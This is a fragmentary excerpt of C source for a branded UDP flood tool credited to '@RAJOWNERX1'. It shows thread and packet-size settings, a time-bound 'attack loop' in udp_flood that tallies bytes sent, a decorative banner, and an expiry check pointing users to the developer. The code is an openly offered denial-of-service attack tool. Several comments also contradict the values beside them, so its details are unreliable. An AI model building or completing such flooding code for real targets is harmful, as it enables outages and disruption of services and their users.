...
#define DEFAULT_PACKET_SIZE 1024 // पैकेट का साइज 64 बाइट्स
#define DEFAULT_THREAD_COUNT 1000 // थ्रेड्स की संख्या
#define TARGET_DATA_LIMIT (3LL * 10240 * 1024 * 1024) // 4GB Data Limit in bytes
...
volatile unsigned long long total_bytes_sent = 0; // Track total bytes sent
...
void *udp_flood(void *arg) {
    ...
    // Time-bound attack loop, which runs for the full duration
    unsigned long long data_sent_by_thread = 0;

    time_t start_time = time(NULL); // Start time for the attack
    ...
    while (keep_running && difftime(time(NULL), start_time) < params->duration) {
        ...
        __sync_fetch_and_add(&total_bytes_sent, params->packet_size); // Track total bytes sent
...
void print_stylish_text() {
    ...
    printf("\033[1;35m╠════════════════════════════════════════╣\033[0m\n");
    printf("\033[1;35m║ \033[1;33m✦ DEVELOPED BY: \033[1;32m@RAJOWNERX1 \033[1;35m║\033[0m\n");
    ...
    printf("\033[1;35m║ \033[1;33m✦ CONTACT: \033[1;32m@RAJOWNERX1 \033[1;35m║\033[0m\n");
    printf("\033[1;35m╠════════════════════════════════════════╣\033[0m\n");
...
int main(int argc, char *argv[]) {
    ...
    if (local->tm_year + 1900 > EXPIRATION_YEAR ||
        ...
        printf("\033[1;31mExpired. khatam ho gya h developar se connect kr @RAJOWNERX1.\033[0m\n");
        return EXIT_FAILURE;
    }
